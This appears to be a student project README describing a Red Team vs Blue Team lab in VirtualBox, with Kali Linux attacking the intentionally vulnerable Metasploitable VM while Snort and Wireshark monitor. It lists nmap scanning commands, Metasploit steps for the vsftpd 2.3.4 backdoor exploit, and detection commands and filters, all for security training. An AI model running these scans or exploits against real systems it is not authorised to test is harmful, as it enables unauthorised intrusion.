# Red Team vs Blue Team Simulation Lab

## Project Title
Red Team vs Blue Team Simulation Lab: Creating a Defensive and Offensive Environment to Practice Attack Detection and Response

---

# 1. Introduction

Cybersecurity professionals often simulate cyber attacks to test how well security systems detect and respond to threats. These simulations are known as **Red Team vs Blue Team exercises**.

Red Team represents attackers who attempt to exploit vulnerabilities in systems.

Blue Team represents defenders who monitor networks and detect malicious activity.

This project creates a controlled cybersecurity lab environment where both offensive and defensive techniques can be practiced.

---

# 2. Project Objective

The objective of this project is to:

• Simulate real-world cyber attacks  
• Identify vulnerable services on a system  
• Exploit vulnerabilities using penetration testing tools  
• Detect attacks using defensive monitoring tools  
• Analyze malicious network traffic  

---

# 3. Lab Environment

This project uses a virtual lab environment consisting of three systems.

### Attacker Machine
Kali Linux

Kali Linux is a penetration testing operating system containing many security tools used by cybersecurity professionals.

Tools used from Kali Linux:

Nmap  
Metasploit Framework  

---

### Target Machine
Metasploitable

Metasploitable is an intentionally vulnerable Linux system used for practicing penetration testing.

It contains many vulnerable services such as:

FTP  
SSH  
Web Server  
Database Services  

---

### Defensive Monitoring System

The Blue Team monitors attacks using the following tools:

Snort – Intrusion Detection System used to detect suspicious traffic

Wireshark – Network packet analyzer used to inspect network communication

---

# 4. Virtual Lab Architecture

The lab architecture consists of three main components.

Attacker System (Kali Linux)

Target System (Metasploitable)

Monitoring System (Snort IDS and Wireshark)

Network Structure

Kali Linux (Attacker)
        |
        | Attack Traffic
        |
Metasploitable (Target)
        |
        | Monitoring
        |
Snort IDS / Wireshark

All systems run inside VirtualBox using an Internal Network.

---

# 5. Tools Used

Nmap  
Network scanning tool used to discover hosts and open ports.

Metasploit Framework  
Penetration testing framework used to exploit vulnerabilities.

Snort  
Intrusion Detection System used to detect suspicious network activity.

Wireshark  
Network packet analyzer used to capture and analyze packets.

VirtualBox  
Virtualization platform used to run multiple operating systems.

---

# 6. Lab Setup

Step 1  
Install VirtualBox on the host machine.

Step 2  
Download and import the following virtual machines:

Kali Linux  
Metasploitable

Step 3  
Configure network settings.

VirtualBox → Network Settings → Internal Network

Step 4  
Start both virtual machines.

---

# 7. Network Connectivity Test

Before performing attacks, verify that both machines can communicate.

Run the following command in Kali Linux:

ping TARGET_IP

If replies are received, the network connection is successful.

---

# 8. Red Team Attack Phase

All attack commands are executed from the Kali Linux terminal.

---

## Host Discovery

Check whether the target machine is active.

Command:

nmap -sn TARGET_IP

Purpose  
Detects whether the target host is alive.

---

## Port Scanning

Identify open ports on the target machine.

Command:

nmap -sS --open TARGET_IP

Purpose  
Displays only open ports.

---

## Service Detection

Identify services running on open ports.

Command:

nmap -sV TARGET_IP

Example services:

FTP  
SSH  
HTTP  

---

## Vulnerability Detection

Command:

nmap --script vuln TARGET_IP

Purpose  
Detects known vulnerabilities in running services.

---

## Exploitation Using Metasploit

Start Metasploit.

Command:

msfconsole

Search for exploits.

search vsftpd

Use exploit.

use exploit/unix/ftp/vsftpd_234_backdoor

Set target IP.

set RHOST TARGET_IP

Run exploit.

exploit

If successful, the attacker gains access to the system.

---

# 9. Blue Team Defense Phase

The Blue Team monitors network activity to detect attacks.

---

## Snort Intrusion Detection

Run Snort using the following command:

sudo snort -A console -q -c /etc/snort/snort.conf -i eth0

Snort detects:

Port scanning  
Exploit attempts  
Suspicious network activity

---

## Wireshark Packet Analysis

Wireshark captures network traffic for analysis.

Common filters used:

icmp

Detects ping traffic.

tcp.flags.syn == 1

Detects port scanning attempts.

---

# 10. Experiment Workflow

1 Setup virtual machines  
2 Configure network  
3 Verify connectivity  
4 Perform host discovery  
5 Identify open ports  
6 Detect running services  
7 Identify vulnerabilities  
8 Exploit vulnerable services  
9 Monitor attacks using Snort  
10 Analyze packets using Wireshark  

---

# 11. Screenshots to Capture

The following screenshots should be added to the project repository.

Virtual machine network setup  
Host discovery scan  
Open port scan  
Service detection scan  
Metasploit exploit success  
Snort alert detection  
Wireshark packet capture  

---

# 12. Learning Outcomes

After completing this lab, the following concepts are understood:

Penetration testing methodology  
Vulnerability identification  
Exploitation techniques  
Intrusion detection systems  
Network traffic analysis  

---

# 13. Future Improvements

Possible improvements to the project include:

Integration of SIEM tools such as Splunk

Automated vulnerability scanning

Python-based attack detection

Machine learning based anomaly detection

---

# 14. Conclusion

This project demonstrates how attackers identify vulnerabilities and how defenders detect malicious activities. Understanding both offensive and defensive techniques helps build stronger and more secure systems.
